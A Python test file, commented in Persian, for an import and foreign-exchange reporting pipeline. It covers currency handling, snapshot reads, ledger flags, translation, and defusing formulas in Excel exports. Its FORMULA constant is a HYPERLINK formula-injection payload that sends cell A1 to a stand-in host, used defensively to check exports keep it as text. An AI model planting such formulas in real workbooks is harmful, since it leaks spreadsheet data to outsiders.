# -*- coding: utf-8 -*-
"""29.19 — نقص‌هایی که بازبینی مالک پروژه پیدا کرد، هر کدام با آزمون بازتولید.

هر آزمون روی کد پیش از اصلاح شکست می‌خورد و خطای مالی یا داده‌ای مشخصی را قفل می‌کند:
  * ارزش بارنامه با ارز نامعلوم وارد جمع حمل‌شده ثبت سفارش نشود؛ ثبت سفارش با ارز
    نامعلوم هم با ارزش بارنامه‌ها مقایسه یا جمع نشود؛
  * تعارض ارزش فاکتور ساتا با ارزش اظهار گمرکی «پوشانده» نشود؛
  * جمع جریان پول برای ارز نامعلوم زده نشود (مبلغ‌های چند ارز ناشناخته جمع‌پذیر نیستند)؛
  * خواندن Snapshot فقط داده منتشرشده را ببیند: جدول تازه بی‌نسخه، View پایگاه قدیمی؛
    و تغییر ساختار جدول بین دو اجرا، ثبت Snapshot را نشکند؛
  * در دفتر مالی، متن نامعتبر مبلغ «نامعلوم» بماند نه صفر، و پرچم خالی یا منفی
    تخصیص (NaN، «خیر»، «0») «تخصیص انجام‌شده» خوانده نشود؛ همین برای پرچم‌های مارت؛
  * متن منبعی که با «=» شروع می‌شود در هیچ خروجی Excel فرمول نشود؛
  * پیام‌های تازه (ارز نامعلوم و پرچم‌های پیوند) در گزارش و Excel انگلیسی ترجمه شوند؛
    همین‌طور متن خود برنامه (رویداد پول، تصمیم مالی، شاهد مرحله، اقدام بعدی، علت بحرانی)؛
    مقدار فایل منبع همان‌طور می‌ماند.
"""
from __future__ import annotations

import io
import math
import sqlite3
from datetime import date

import pandas as pd
import pytest
from openpyxl import load_workbook

from gsi.core.text import flag_true
from gsi.report import fx_insight as X
from gsi.stages.base import PipelineContext
from gsi.stages.s56_money_flow_control import MoneyFlowControlStage
from gsi.stages.s59_bl_registration_link import (BLRegistrationLinkStage, ST_BL_UNKNOWN, ST_CCY_UNKNOWN,
                                                 ST_LINKED, ST_PARTIAL)
from gsi.warehouse import snapshots
from gsi.warehouse.business_dwh import build
from gsi.warehouse.store import Warehouse

TODAY = date(2026, 9, 27)
FORMULA = '=HYPERLINK("http://example.invalid/?q="&A1,"کلیک")'


# ═══════════════════════════ پیوند بارنامه ↔ ثبت سفارش ═══════════════════════════
class _RB:
    ALIASES = {"یورو": "EUR", "یوان": "CNY", "درهم": "AED"}

    def normalize_currency(self, v):
        t = "" if v is None else str(v).strip()
        return self.ALIASES.get(t, t.upper() if t.lower() not in ("", "nan", "none") else "")


def _row(reg, bl, mat, value, ccy, **kw):
    r = {"KEY_REG": reg, "CANONICAL_BL": bl, "KEY_ORDER": "O-" + reg, "KEY_MATERIAL": mat,
         "INVOICE_VALUE": value, "INVOICE_CURRENCY": ccy}
    r.update(kw)
    return r


def _link(rows, credit=()):
    ctx = PipelineContext(rb=_RB(), today=TODAY)
    if credit:
        ctx.sources["credit"] = {"main": pd.DataFrame(
            [{"KEY_REG": r, "CRD_PROFORMA_VALUE": v, "CRD_CURRENCY": c} for r, v, c in credit])}
    out = BLRegistrationLinkStage().run(pd.DataFrame(rows), ctx)
    return (out, ctx.extras["registration_value_recon"].set_index("KEY_REG"),
            ctx.extras["bl_registration_link"].set_index("KEY_BL"))


def test_bl_with_unknown_currency_is_not_added_to_the_registration_total():
    _, recon, link = _link([_row("R1", "BL1", "M1", 500, "EUR"), _row("R1", "BL2", "M2", 300, "")],
                           credit=[("R1", 1000, "EUR")])
    assert recon.loc["R1", "SHIPPED_VALUE"] == 500            # نه ۸۰۰
    assert recon.loc["R1", "SHIPPED_PCT"] == 50
    assert recon.loc["R1", "STATUS"] == ST_PARTIAL
    assert bool(recon.loc["R1", "SHIPPED_IS_LOWER_BOUND"])
    assert "ارز نامعلوم" in recon.loc["R1", "FLAGS"]
    assert link.loc["BL2", "STATUS"] == ST_CCY_UNKNOWN and link.loc["BL1", "STATUS"] == ST_LINKED
    assert pd.isna(link.loc["BL2", "SHARE_PCT"])


def test_registration_with_unknown_currency_is_not_compared_with_bl_values():
    out, recon, link = _link([_row("R1", "BL1", "M1", 500, "EUR")], credit=[("R1", 1000, "")])
    r = recon.loc["R1"]
    assert r["REG_VALUE"] == 1000 and r["REG_CURRENCY"] == ""
    assert r["STATUS"] == ST_CCY_UNKNOWN
    assert pd.isna(r["SHIPPED_VALUE"]) and pd.isna(r["SHIPPED_PCT"]) and pd.isna(r["UNSHIPPED_VALUE"])
    assert link.loc["BL1", "STATUS"] == ST_CCY_UNKNOWN
    assert out["BLREG_REG_SHIPPED_PCT"].isna().all()


def test_bls_of_different_currencies_are_never_summed_for_a_registration_without_value():
    _, recon, _ = _link([_row("R9", "BL1", "M1", 500, "EUR"), _row("R9", "BL2", "M2", 9000, "CNY")])
    assert pd.isna(recon.loc["R9", "SHIPPED_VALUE"])          # نه ۹۵۰۰ «بی‌ارز»


def test_conflicting_invoice_values_are_not_replaced_by_the_customs_value():
    rows = [_row("R1", "BL1", "M1", 400, "EUR", CL_INVOICE_VALUE=450, CL_CURRENCY="EUR"),
            _row("R1", "BL1", "M2", 500, "EUR", CL_INVOICE_VALUE=450, CL_CURRENCY="EUR")]
    _, recon, link = _link(rows, credit=[("R1", 1000, "EUR")])
    b = link.loc["BL1"]
    assert pd.isna(b["BL_INVOICE_VALUE"])                     # ۴۵۰ گمرک جای تعارض ۴۰۰/۵۰۰ نمی‌نشیند
    assert b["BL_VALUE_BASIS"] == "تعارض"
    assert "چند ارزش متفاوت فاکتور" in b["FLAGS"]
    assert b["STATUS"] == ST_BL_UNKNOWN
    assert recon.loc["R1", "SHIPPED_VALUE"] == 0 and bool(recon.loc["R1", "SHIPPED_IS_LOWER_BOUND"])


def test_customs_value_still_fills_a_missing_sata_value():
    _, recon, link = _link([_row("R1", "BL1", "M1", None, "", CL_INVOICE_VALUE=450, CL_CURRENCY="یورو")],
                           credit=[("R1", 1000, "EUR")])
    assert link.loc["BL1", "BL_INVOICE_VALUE"] == 450
    assert link.loc["BL1", "BL_VALUE_BASIS"] == "ارزش فاکتور اظهار گمرکی"
    assert recon.loc["R1", "SHIPPED_VALUE"] == 450


def test_money_totals_are_not_summed_for_unknown_currency():
    frame = pd.DataFrame([
        {"KEY_REG": "R1", "CURRENCY": "", "REQUESTED_AMOUNT": 300.0},
        {"KEY_REG": "R2", "CURRENCY": None, "REQUESTED_AMOUNT": 9000.0},
        {"KEY_REG": "R3", "CURRENCY": "EUR", "REQUESTED_AMOUNT": 100.0},
        {"KEY_REG": "R4", "CURRENCY": "EUR", "REQUESTED_AMOUNT": 50.0},
    ])
    for k, _fa in X.MONEY_STEPS:
        if k not in frame:
            frame[k] = None
    t = X.money_totals(frame).set_index("CURRENCY")
    assert t.loc["EUR", "REQUESTED_AMOUNT"] == 150
    unknown = t.loc["نامشخص"]
    assert unknown["REGISTRATIONS"] == 2
    assert unknown["REQUESTED_AMOUNT"] is None or pd.isna(unknown["REQUESTED_AMOUNT"])   # نه ۹۳۰۰


def _mixed_links():
    """پنج ثبت سفارش با همه پرچم‌های پیوند: ارز نامعلوم، ارز ثبت سفارش نامعلوم، تعارض و سهم مشترک."""
    rows = [_row("R1", "BL1", "M1", 500, "EUR", MATERIAL_DESC="Valve"),
            _row("R1", "BL2", "M2", 300, "", MATERIAL_DESC="Pump"),
            _row("R2", "BL3", "M3", 400, "EUR", MATERIAL_DESC="Seal", CL_INVOICE_VALUE=450, CL_CURRENCY="CNY"),
            _row("R3", "BL4", "M4", 100, "EUR", MATERIAL_DESC="Gear"),
            _row("R3", "BL4", "M5", 120, "EUR", MATERIAL_DESC="Bolt"),
            _row("R4", "BL5", "M6", 70, "AED", MATERIAL_DESC="Tube"),
            _row("R5", "BL5", "M7", 70, "AED", MATERIAL_DESC="Hose")]
    ctx = PipelineContext(rb=_RB(), today=TODAY)
    ctx.sources["credit"] = {"main": pd.DataFrame(
        [{"KEY_REG": r, "CRD_PROFORMA_VALUE": v, "CRD_CURRENCY": c}
         for r, v, c in [("R1", 1000, "EUR"), ("R2", 1000, ""), ("R3", 1000, "EUR"),
                         ("R4", 500, "AED"), ("R5", 500, "AED")]])}
    out = BLRegistrationLinkStage().run(pd.DataFrame(rows), ctx)
    return out, dict(ctx.extras)


def test_english_report_and_workbooks_translate_every_link_flag():
    import re
    from gsi.i18n import columns as C
    from gsi.report import fx_excel as XE
    from gsi.report import fx_html as H
    persian = re.compile(r"[؀-ۿ]")
    out, extras = _mixed_links()
    flags = " · ".join(extras["registration_value_recon"]["FLAGS"].tolist()
                       + extras["bl_registration_link"]["FLAGS"].tolist())
    assert "ارز نامعلوم" in flags and "مقایسه و جمع نشد" in flags and "چند ارزش متفاوت" in flags
    page = H.build_report(out, extras, "2026-09-27", lang=C.EN, embed_fonts=False)
    body = re.sub(r'href="data:[^"]*"', "", re.sub(r"<style>.*?</style>", "", page, flags=re.S))
    left = {t.strip() for t in re.split(r"<[^>]+>", body) if persian.search(t)}
    assert left == set(), sorted(left)
    assert "B/L(s) with unknown currency (left out of the total)" in page
    assert "Currency unknown" in page
    fx = X.load(out, extras, "2026-09-27")
    for data in (XE.stage_workbook(fx, lang=C.EN), XE.registration_workbook(fx, None, lang=C.EN)):
        wb = load_workbook(io.BytesIO(data))
        bad = {v for ws in wb.worksheets for row in ws.iter_rows(values_only=True) for v in row
               if isinstance(v, str) and persian.search(v)}
        assert bad == set(), sorted(bad)


def test_persian_report_keeps_flags_in_persian_and_marks_unsummed_currency():
    from gsi.report import fx_html as H
    out, extras = _mixed_links()
    extras["fx_money_reconciliation"] = pd.DataFrame([
        {"KEY_REG": "R1", "CURRENCY": "EUR", "REQUESTED_AMOUNT": 100.0},
        {"KEY_REG": "R2", "CURRENCY": "", "REQUESTED_AMOUNT": 300.0},
        {"KEY_REG": "R3", "CURRENCY": None, "REQUESTED_AMOUNT": 9000.0}])
    fx = X.load(out, extras, "2026-09-27")
    money = H.money_section(fx)
    assert "ارز نامعلوم؛ مبلغ‌ها جمع زده نمی‌شوند" in money and "9,300.00" not in money
    assert "ارز نامعلوم ردیف جدا دارد و جمع زده نمی‌شود." in H.email_section(fx)
    links = H.bl_link_section(fx)
    assert "1 بارنامه با ارز نامعلوم (در جمع نیامد)" in links


def test_english_registration_workbook_translates_money_events_decisions_and_stage_evidence():
    """نام رویداد پول، تصمیم مالی و شاهد هر مرحله متن خود برنامه است؛ در Excel انگلیسی فقط
    وضعیت متنی منبع (بانک و سامانه جامع) فارسی می‌ماند."""
    import re
    from gsi.i18n import columns as C
    from gsi.report import fx_excel as XE
    from gsi.rulebook import get_rulebook
    source_text = {"گشایش شده", "منتظر بررسی بانک", "رفع تعهد نشده"}
    ctx = PipelineContext(rb=get_rulebook(), today=TODAY)
    ctx.sources.update(
        credit={"main": pd.DataFrame([{"KEY_REG": "R1", "CRD_PROFORMA_VALUE": 1000, "CRD_CURRENCY": "EUR",
                                       "CRD_REG_DATE": "2026-04-01", "CRD_SWIFT_AMOUNT": 900,
                                       "CRD_SWIFT_CURRENCY": "EUR", "CRD_LAST_STATUS": "گشایش شده"}])},
        ntsw={"allocation_rows": pd.DataFrame([
            {"KEY_REG": "R1", "NTSW_REQUEST_STATE": "ALLOCATED", "NTSW_REQ_AMOUNT": 1000, "NTSW_REQ_CURRENCY": "EUR",
             "NTSW_REQ_DATE": "2026-04-05", "NTSW_ALLOC_DATE": "2026-04-20", "NTSW_ALLOC_STATUS": "تخصیص یافته"},
            {"KEY_REG": "R1", "NTSW_REQUEST_STATE": "OPEN", "NTSW_REQ_AMOUNT": 200, "NTSW_REQ_CURRENCY": "EUR",
             "NTSW_REQ_DATE": "2026-05-01", "NTSW_ALLOC_STATUS": "منتظر بررسی بانک"}]),
              "commitment": pd.DataFrame([{"KEY_REG": "R1", "NTSW_INITIAL_COMMIT": 1000, "NTSW_BALANCE": 400,
                                           "NTSW_CURRENCY": "EUR", "NTSW_RELEASE_STATUS": "رفع تعهد نشده",
                                           "NTSW_DEADLINE": "2026-12-01"}])},
        fx_transaction={"main": pd.DataFrame([{"KEY_REG": "R1", "FX_CURRENCY": "EUR", "FX_AMOUNT": 800,
                                               "FX_BUY_DATE": "2026-05-01", "FX_PAID_AMOUNT": 700,
                                               "FX_PAID_CURRENCY": "EUR"}])})
    stage = MoneyFlowControlStage()
    money = stage._build_money_ledger(pd.DataFrame(), ctx)
    recon = stage._build_money_reconciliation(money)
    fx_ledger = pd.DataFrame([{"KEY_REG": "R1", "FX_NTSW_BALANCE": 400, "FX_NTSW_RELEASE_STATUS": "رفع تعهد نشده",
                               "FX_ALLOC_STATUS": "تخصیص یافته"}])
    timeline = stage._build_timeline(pd.DataFrame(), ctx, fx_ledger, pd.DataFrame(columns=["KEY_REG", "STATUS"]))
    ctx.extras.update(fx_stage_timeline=timeline, fx_money_ledger=money, fx_money_reconciliation=recon,
                      fx_financial_decisions=stage._build_financial_decisions(money, recon, timeline, fx_ledger, ctx))
    out = BLRegistrationLinkStage().run(pd.DataFrame([_row("R1", "BL1", "M1", 500, "EUR", MATERIAL_DESC="Valve")]), ctx)
    wb = load_workbook(io.BytesIO(XE.registration_workbook(X.load(out, dict(ctx.extras), "2026-09-27"), None,
                                                           lang=C.EN)))
    cells = [v for ws in wb.worksheets for row in ws.iter_rows(values_only=True) for v in row if isinstance(v, str)]
    source = re.compile("|".join(map(re.escape, sorted(source_text, key=len, reverse=True))))
    left = {v for v in cells if re.search(r"[؀-ۿ]", source.sub("", v))}
    assert left == set(), sorted(left)
    for en in ("FX allocation request", "Initial FX commitment", "Registration on file; 2026-04-01",
               "Open request=1; Open amount=200.00 EUR; Rank is not in the export",
               "Difference between the ALLOCATION_REQUEST and ALLOCATION evidence; not a proven cash balance",
               "ALLOCATION / Link document and independent confirmation",
               "For this row EVENT_DATE is the settlement deadline, not a transaction date"):
        assert en in cells, en


def test_english_critical_outputs_translate_next_action_and_critical_reason():
    from gsi.i18n import columns as C
    from gsi.report import critical_board as CB
    from gsi.report import fx_excel as XE
    from gsi.rulebook import get_rulebook
    rb = get_rulebook()
    titles = [v["action_fa"] for v in rb.get("case_actions", {}).values() if isinstance(v, dict) and v.get("action_fa")]
    actions = [b["action"] for b in rb.get("criticality.bands") if b.get("action")]
    assert titles and actions
    assert [t for t in titles + actions if C.is_persian(C.phrase(t, C.EN))] == []
    title = rb.get("case_actions.customs_to_clearance")["action_fa"]
    df = pd.DataFrame([_row("R9", "BL9", "M9", 100, "EUR", MATERIAL_DESC="Valve", BL_CRITICAL_LEVEL="CRITICAL",
                            ORDER_CRITICAL_LEVEL="CRITICAL", NEXT_ACTION_TITLE=title, LIFECYCLE_STAGE="ترخیص",
                            BL_CRITICAL_REASON="M9: بحرانی (3.0 روز) | M8: توقف خط (نامشخص)",
                            **{"کد طبقه بحرانی": "CRITICAL", "مقاومت (روز)": 3})])
    ctx = PipelineContext(rb=rb, today=TODAY)
    out = BLRegistrationLinkStage().run(df, ctx)
    page = CB.build_critical_html(out, "2026-09-27", lang=C.EN)
    assert C.phrase(title, C.EN) in page and title not in page
    wb = load_workbook(io.BytesIO(XE.critical_workbook(X.load(out, dict(ctx.extras), "2026-09-27"), out, lang=C.EN)))
    cells = {v for ws in wb.worksheets for row in ws.iter_rows(values_only=True) for v in row if isinstance(v, str)}
    assert "M9: Critical (3.0 days) | M8: Line stop (Unknown)" in cells
    assert C.phrase(title, C.EN) in cells and title not in cells


def test_source_flags_in_the_mart_read_text_false_and_empty_as_false():
    from gsi.rulebook import get_rulebook
    from gsi.stages.s20_derive import DeriveStage
    df = pd.DataFrame({"KEY_MATERIAL": ["M1", "M2", "M3", "M4", "M5"],
                       "NTSW_ALLOCATED": ["False", "خیر", None, True, "1"],
                       "CL_IS_FULL": [float("nan"), "0", "بله", False, 1]}, dtype=object)
    out = DeriveStage().run(df, PipelineContext(rb=get_rulebook(), today=TODAY))
    assert out["ALLOCATED"].tolist() == [False, False, False, True, True]
    assert out["IS_FULL_CLEARED"].tolist() == [False, False, True, False, True]


# ═══════════════════════════ Snapshot منتشرشده ═══════════════════════════
def _publish(wh, sources):
    with wh.run({"test": "r4"}) as rid:
        build(wh, sources, rid)
    wh.publish(rid)
    return rid


def _order_sources(order="A", bl="BL1"):
    return {"abbasi": {"main": pd.DataFrame([{"KEY_ORDER": order, "KEY_BL": bl}])}}


def test_table_created_after_the_published_run_is_not_read_from_live_rows(tmp_path):
    wh = Warehouse(tmp_path / "w.sqlite")
    _publish(wh, _order_sources())
    with wh.db() as c:                       # جدول تازه (مثلاً پس از ارتقای برنامه)، هنوز بی‌نسخه منتشرشده
        c.execute("CREATE TABLE dwh_fact_new_evidence(reg_key TEXT, amount REAL)")
        c.execute("INSERT INTO dwh_fact_new_evidence VALUES('R1', 999)")
    with wh.read_db() as c:
        assert c.execute("SELECT count(*) FROM dwh_fact_new_evidence").fetchone()[0] == 0


def _seq(wh, rid):
    with wh.read_db(bind=False) as c:
        return c.execute("SELECT seq FROM wh_run WHERE id=?", (rid,)).fetchone()[0]


def test_column_added_between_two_runs_does_not_break_the_snapshot(tmp_path):
    wh = Warehouse(tmp_path / "w.sqlite")
    first = _publish(wh, _order_sources("A"))
    with wh.db() as c:                       # ستونی که قالب نسخه‌دار نمی‌شناسد
        c.execute("ALTER TABLE dwh_entity ADD COLUMN review_note TEXT")
    second = _publish(wh, _order_sources("B"))
    with wh.read_db() as c:
        keys = {r[0] for r in c.execute("SELECT business_key FROM dwh_entity WHERE entity_type='ORDER'")}
        assert keys == {"B"}
        columns = [d[0] for d in c.execute("SELECT * FROM dwh_entity").description]
        assert columns == ["entity_type", "business_key", "first_seen_run", "last_seen_run"]
    with wh.read_db(bind=False) as c:        # وضعیت هر اجرا از بازه اعتبار ردیف‌ها، بدون کپی
        old = c.execute(snapshots.as_of_sql("dwh_entity", _seq(wh, first), first, c)).fetchall()
        new = c.execute(snapshots.as_of_sql("dwh_entity", _seq(wh, second), second, c)).fetchall()
    assert {r[1] for r in old if r[0] == "ORDER"} == {"A"}
    assert {r[1] for r in new if r[0] == "ORDER"} == {"B"}


def test_template_column_missing_from_the_file_reads_as_null(tmp_path):
    from gsi.warehouse import business_dwh
    wh = Warehouse(tmp_path / "w.sqlite")
    _publish(wh, _order_sources("A"))
    spec = business_dwh.TABLES["dwh_dim_order"]
    extended = business_dwh.TableSpec(spec.name, spec.columns + (business_dwh.Col("region", "value", "TEXT"),))
    business_dwh.TABLES[spec.name] = extended
    try:
        with wh.read_db() as c:              # برنامه تازه‌تر، هنوز بی‌ساخت: ستون تازه NULL
            assert c.execute("SELECT order_key, region FROM dwh_dim_order").fetchall() == [("A", None)]
        _publish(wh, _order_sources("A"))    # ساخت بعدی ستون را به جدول اضافه می‌کند
        with wh.read_db(bind=False) as c:
            assert "region" in business_dwh.physical_columns(c, "dwh_dim_order")
        with wh.read_db() as c:
            assert c.execute("SELECT order_key FROM dwh_dim_order").fetchall() == [("A",)]
        with pytest.raises(sqlite3.IntegrityError):
            with wh.db() as c:
                c.execute("UPDATE dwh_dim_order SET region='X'")
    finally:
        business_dwh.TABLES[spec.name] = spec


def test_bound_views_keep_the_version_1_columns_in_order(tmp_path):
    from gsi.warehouse.business_dwh import TABLES
    wh = Warehouse(tmp_path / "w.sqlite")
    _publish(wh, _order_sources())
    with wh.read_db() as c:
        for name, t in TABLES.items():
            columns = [d[0] for d in c.execute(f"SELECT * FROM {name} LIMIT 0").description]
            assert columns == [col.name for col in t.columns], name


def test_version_1_warehouse_is_archived_untouched_and_never_read(tmp_path):
    path = tmp_path / "w.sqlite"
    with sqlite3.connect(path) as c:         # انبار نسخه ۱ با ردیف‌های کاری منتشرنشده
        c.execute("CREATE TABLE wh_meta(key TEXT PRIMARY KEY, value TEXT NOT NULL)")
        c.execute("CREATE TABLE dwh_entity(entity_type TEXT, business_key TEXT, first_seen_run TEXT, "
                  "last_seen_run TEXT)")
        c.execute("INSERT INTO dwh_entity VALUES('ORDER','LEGACY','r0','r0')")
        c.execute("PRAGMA user_version=1")
    original = path.read_bytes()
    wh = Warehouse(path)
    archived = sorted(tmp_path.glob("w.v1-archive-*.sqlite"))
    assert len(archived) == 1 and archived[0].read_bytes() == original
    with wh.read_db() as c:
        assert c.execute("SELECT count(*) FROM dwh_entity").fetchone()[0] == 0
        assert c.execute("SELECT count(*) FROM dwh_registration_hub").fetchone()[0] == 0


def test_published_views_still_read_the_published_run(tmp_path):
    wh = Warehouse(tmp_path / "w.sqlite")
    # R8: ثبت سفارش در انبار داده فقط ۸ رقمی معتبر است
    _publish(wh, {"ntsw": {"import_license": pd.DataFrame([{"KEY_REG_FILE": "F", "KEY_REG": "88000001"}])},
                  "ilappend": {"main": pd.DataFrame([{"KEY_REG_FILE": "F", "KEY_ORDER": "A"}])}})
    with wh.read_db() as c:
        rows = c.execute("SELECT reg_file_key, reg_key, order_key FROM dwh_registration_hub").fetchall()
    assert rows == [("F", "88000001", "A")]


# ═══════════════════════════ دفتر مالی و پرچم‌ها ═══════════════════════════
def _ledger(**sources):
    ctx = PipelineContext(rb=None, today=TODAY)
    ctx.sources.update(sources)
    return MoneyFlowControlStage()._build_money_ledger(pd.DataFrame(), ctx)


def test_unparsable_amount_text_stays_unknown_in_the_ledger():
    credit = pd.DataFrame([{"KEY_REG": "R1", "CRD_PROFORMA_VALUE": "ارقام بعداً", "CRD_CURRENCY": "EUR"},
                           {"KEY_REG": "R2", "CRD_PROFORMA_VALUE": "1,234.50", "CRD_CURRENCY": "EUR"},
                           {"KEY_REG": "R3", "CRD_PROFORMA_VALUE": 0, "CRD_CURRENCY": "EUR"}])
    led = _ledger(credit={"main": credit})
    reg = led[led["EVENT_CODE"].eq("REGISTRATION_VALUE")].set_index("KEY_REG")["AMOUNT"]
    assert pd.isna(reg["R1"])                                  # نه ۰٫۰
    assert reg["R2"] == 1234.5
    assert reg["R3"] == 0                                      # صفر صریح منبع صفر می‌ماند


@pytest.mark.parametrize("flag", [None, float("nan"), "", "خیر", "no", "0", "False", 0, False])
def test_empty_or_negative_allocation_flag_is_not_an_allocation(flag):
    rows = pd.DataFrame([{"KEY_REG": "R1", "NTSW_REQUEST_STATE": "", "NTSW_ALLOCATED": flag,
                          "NTSW_REQ_AMOUNT": 100, "NTSW_REQ_CURRENCY": "EUR"}], dtype=object)
    led = _ledger(ntsw={"allocation_rows": rows})
    assert set(led["EVENT_CODE"]) == {"ALLOCATION_REQUEST"}


@pytest.mark.parametrize("flag", [True, 1, "1", "yes", "True", "بله", "تخصیص یافته"])
def test_positive_allocation_flag_is_an_allocation(flag):
    rows = pd.DataFrame([{"KEY_REG": "R1", "NTSW_REQUEST_STATE": "", "NTSW_ALLOCATED": flag,
                          "NTSW_REQ_AMOUNT": 100, "NTSW_REQ_CURRENCY": "EUR"}], dtype=object)
    led = _ledger(ntsw={"allocation_rows": rows})
    assert set(led["EVENT_CODE"]) == {"ALLOCATION_REQUEST", "ALLOCATION"}


def test_flag_true_reads_only_affirmative_values():
    assert [flag_true(v) for v in (True, 1, 2.0, "1", " YES ", "y", "true", "بله", "تخصیص‌یافته")] == [True] * 9
    assert [flag_true(v) for v in (None, float("nan"), pd.NA, pd.NaT, "", " ", "0", "خیر", "no", "False",
                                   "نامشخص", 0, 0.0, False)] == [False] * 14


def test_unparsable_conversion_fee_is_unknown_not_an_explicit_zero():
    fx = pd.DataFrame([{"KEY_REG": "R1", "FX_CURRENCY": "EUR", "FX_AMOUNT": 100, "FX_RATE": 50,
                        "FX_PAID_CURRENCY": "EUR", "FX_PAID_AMOUNT": 100, "FX_CONVERSION_FEE_RIAL": "ندارد؟"}])
    ctx = PipelineContext(rb=None, today=TODAY)
    ctx.sources["fx_transaction"] = {"main": fx}
    bridge = MoneyFlowControlStage()._build_rate_bridge(ctx)
    row = bridge.iloc[0]
    assert row["STATUS"] == "SAME_CURRENCY"
    assert row["CONVERSION_FEE_RIAL"] is None or pd.isna(row["CONVERSION_FEE_RIAL"])
    assert row["IMPACT_RIAL"] is None or pd.isna(row["IMPACT_RIAL"])


def test_empty_full_clearance_flag_is_not_clearance_evidence():
    from gsi.resolve.process_evidence import build_process_inventory
    cl = pd.DataFrame([{"KEY_ORDER": "A", "KEY_BL": "BL1", "CL_COTAGE_NO": "C-1", "CL_COTAGE_DATE": "2026-05-01",
                        "CL_IS_FULL": float("nan"), "CL_CLEAR_DATE": ""}], dtype=object)
    obs, _cases, _m = build_process_inventory({"clearance": {"main": cl}})
    assert "CUSTOMS" in set(obs["STAGE_CODE"])
    assert "CLEARANCE" not in set(obs["STAGE_CODE"])


# ═══════════════════════════ متن «=» در Excel ═══════════════════════════
def _formula_cells(wb):
    return [(ws.title, c.coordinate, c.value) for ws in wb.worksheets
            for row in ws.iter_rows() for c in row if c.data_type == "f"]


def _texts(wb):
    return {c.value for ws in wb.worksheets for row in ws.iter_rows() for c in row if isinstance(c.value, str)}


def test_fx_workbooks_keep_source_text_starting_with_equals_as_text():
    from gsi.report import fx_excel as XE
    rows = [dict(_row("R1", "BL1", "M1", 400, "EUR"), MATERIAL_DESC=FORMULA, KEY_ORDER="=1+1",
                 MOGH_CURRENCY="EUR", ORDER_CRITICAL_LEVEL="CRITICAL",
                 **{"کد طبقه بحرانی": "CRITICAL", "مقاومت (روز)": 3})]
    ctx = PipelineContext(rb=_RB(), today=TODAY)
    ctx.sources["credit"] = {"main": pd.DataFrame([{"KEY_REG": "R1", "CRD_PROFORMA_VALUE": 1000,
                                                     "CRD_CURRENCY": "EUR"}])}
    out = BLRegistrationLinkStage().run(pd.DataFrame(rows), ctx)
    fx = X.load(out, dict(ctx.extras), "2026-09-27")
    for data in (XE.stage_workbook(fx), XE.registration_workbook(fx, ["R1"]), XE.critical_workbook(fx, out)):
        wb = load_workbook(io.BytesIO(data))
        assert _formula_cells(wb) == []
        assert FORMULA in _texts(wb) and "=1+1" in _texts(wb)


def test_main_dashboard_keeps_its_own_formulas_and_turns_source_formulas_into_text(tmp_path):
    from gsi.report.dashboard import ExcelDashboardBuilder
    from gsi.stages.base import ColumnSpec
    df = pd.DataFrame({"KEY_MATERIAL": ["M1", "M2"], "شرح": [FORMULA, "عادی"],
                       "وضعیت هوشمند": ["بحرانی", ""]})
    b = ExcelDashboardBuilder(str(tmp_path / "d.xlsx"))
    n = b.build_matrix(df, [ColumnSpec("KEY_MATERIAL", "متریال"), ColumnSpec("شرح", "شرح"),
                            ColumnSpec("وضعیت هوشمند", "وضعیت")])
    b.build_executive({"شاخص": (1, "توضیح")}, "روایت", n)
    wb = load_workbook(b.save())
    formulas = _formula_cells(wb)
    assert formulas and all(v.startswith(("=COUNTIF(", "=SUBTOTAL(")) for _s, _c, v in formulas)
    assert FORMULA in _texts(wb)


def test_studio_excel_export_keeps_source_formulas_as_text(tmp_path):
    from gsi.studio_core.excel_export import build_custom_excel
    df = pd.DataFrame({"KEY_MATERIAL": ["M1"], "شرح کالا": [FORMULA], "کد طبقه بحرانی": ["CRITICAL"]})
    path = build_custom_excel(df, tmp_path / "studio.xlsx", ["kpi", "table"], "2026-09-27",
                              selected_fields=["KEY_MATERIAL", "شرح کالا"])
    wb = load_workbook(path)
    assert _formula_cells(wb) == []
    assert FORMULA in _texts(wb)


def test_keep_text_keeps_the_cell_style_and_the_registered_formula():
    from openpyxl import Workbook
    from openpyxl.styles import Font
    from gsi.core.excel_text import keep_text, write_formula
    wb = Workbook()
    ws = wb.active
    ws["A1"] = FORMULA
    ws["A1"].font = Font(bold=True, color="FF0F766E")
    write_formula(ws, 2, 1, "=SUBTOTAL(109,A1:A1)")
    assert keep_text(wb) == 1
    back = load_workbook(io.BytesIO(_saved(wb))).active
    assert back["A1"].data_type == "s" and back["A1"].value == FORMULA and back["A1"].quotePrefix
    assert back["A1"].font.bold and back["A1"].font.color.rgb == "FF0F766E"
    assert back["A2"].data_type == "f"


def _saved(wb) -> bytes:
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def test_keep_text_leaves_numbers_and_registered_formulas_alone():
    from openpyxl import Workbook
    from gsi.core.excel_text import keep_text
    wb = Workbook()
    ws = wb.active
    ws["A1"], ws["A2"], ws["A3"], ws["A4"] = FORMULA, 12.5, "=SUM(A2:A2)", "#N/A"
    assert keep_text(wb, allowed={(ws.title, "A3")}) == 2
    assert (ws["A1"].data_type, ws["A2"].data_type, ws["A3"].data_type, ws["A4"].data_type) == ("s", "n", "f", "s")
    assert ws["A1"].value == FORMULA and ws["A2"].value == 12.5
    assert math.isclose(ws["A2"].value, 12.5)
